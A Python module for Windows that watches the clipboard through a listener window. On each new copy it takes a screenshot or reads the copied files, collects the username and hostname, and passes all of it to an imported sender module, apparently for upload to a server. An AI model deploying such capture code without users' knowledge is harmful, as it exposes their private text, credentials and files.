import win32clipboard
import win32con
import utility
import win32gui, win32api
import ctypes
import main
from pathlib import Path
import pyautogui
from PIL import Image
import os
import getpass
import socket
import io
import apiSender
import time
import json
import base64
import mimetypes

previous_content = None

def create_window():
    wc = win32gui.WNDCLASS()
    wc.lpfnWndProc = wnd_proc
    wc.lpszClassName = "ClipboardMonitorWindow"
    wc.hInstance = win32api.GetModuleHandle(None)
    class_atom = win32gui.RegisterClass(wc)
    hwnd = win32gui.CreateWindow(class_atom, "ClipboardMonitorWindow", 0, 0, 0, 0, 0, 0, 0, wc.hInstance, None)
    ctypes.windll.user32.AddClipboardFormatListener(hwnd)
    return hwnd

def wnd_proc(hwnd, msg, wparam, lparam):
    if msg == 0x031D:  # WM_CLIPBOARDUPDATE
        process_clipboard()
    return 0

def process_clipboard():
    global previous_content
    win32clipboard.OpenClipboard()
    if win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
        current_content = get_text_clipboard_content()
        if current_content and current_content != previous_content:
            print("Detected new clipboard content, logging.")
            print(current_content)
            imageBase64String = do_screenshot()
            username = read_username()
            hostname = read_hostname()

            data = {
                "username": username,
                "hostname": hostname,
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
                "content": current_content,
                "action_type": "text"
            }
            print(imageBase64String)
            utility.log_clipboard_content(current_content, username + " " + hostname, main.log_file)
            apiSender.send_text_data(imageBase64String, data)
            previous_content = current_content
    elif win32clipboard.IsClipboardFormatAvailable(win32con.CF_HDROP):
        current_content = get_file_clipboard_content()
        if current_content and current_content != previous_content:
            print("Detected new clipboard content, logging.")
            username = read_username()
            hostname = read_hostname()
            files = []
            for file_path in current_content:
                file_data, mime_type = read_file(file_path)
                file_name = os.path.basename(file_path)
                files.append(('files', (file_name, file_data, mime_type)))
            data = {
                "username": username,
                "hostname": hostname,
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
                "content": "",
                "action_type": "files"
            }
            #print(data)
            #print(files)
            apiSender.send_file_data(files, data)
            previous_content = current_content

def get_text_clipboard_content():
    content = None
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
        content = data if isinstance(data, str) else None
    except Exception as e:
        print(f"Error accessing clipboard: {e}")
    finally:
        win32clipboard.CloseClipboard()
    return content

def get_file_clipboard_content():
    content = None
    try:
        data = win32clipboard.GetClipboardData(win32con.CF_HDROP)
        if data:
            content = list(data)
    except Exception as e:
        print(f"Error accessing clipboard: {e}")
    finally:
        win32clipboard.CloseClipboard()
    return content

def read_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        mime_type, _ = mimetypes.guess_type(file_path)
        
        return file_data, mime_type
    except Exception as e:
        print(f"Error reading file {file_path}: {e}")
        return None, None

def do_screenshot():
    screenshot = pyautogui.screenshot()
    temp_file = 'temp_screenshot.png'
    screenshot.save(temp_file)
    img = Image.open(temp_file)
    img.show()
    width, height = img.size
    print(f'Screenshot dimensions: {width} x {height} pixels')
    return byteArray(screenshot)

def byteArray(screenshot):
    original_width, original_height = screenshot.size
    new_width = int(original_width * 0.6)
    new_height = int(original_height * 0.6)
    resized_screenshot = screenshot.resize((new_width, new_height))
    resized_screenshot.save('resized_screenshot.png')
    img_byte_arr = io.BytesIO()
    resized_screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    base64_string = base64.b64encode(img_byte_arr).decode('utf-8')
    return base64_string

def read_username():
    username = getpass.getuser()
    print(f"Username: {username}")
    return username

def read_hostname():
    hostname = socket.gethostname()
    print(f"hostname: {hostname}")
    return hostname

def monitor_clipboard():
    hwnd = create_window()
    while True:
        win32gui.PumpWaitingMessages()